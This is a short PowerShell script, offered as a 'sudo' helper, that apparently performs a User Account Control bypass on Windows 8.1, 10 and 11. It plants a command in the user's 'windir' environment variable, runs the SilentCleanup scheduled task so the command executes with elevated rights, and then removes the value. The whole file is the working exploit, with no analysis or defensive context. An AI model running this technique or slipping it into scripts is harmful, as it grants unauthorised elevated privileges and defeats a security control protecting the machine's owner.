#!/usr/bin/env pwsh
# Author: Aidan Neal <squidwardnose4507@gmail.com>
# Maintainer: Aidan Neal 
# Contact: https://discord.gg/8wBUFeGGYC (Discord)
# Target platform(s): Windows 8.1/10/11
# Description
function sudo {

	$command = "powershell -noexit " + $args + ";#";
	
    Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $command ;
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I;
    Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir"
}

sudo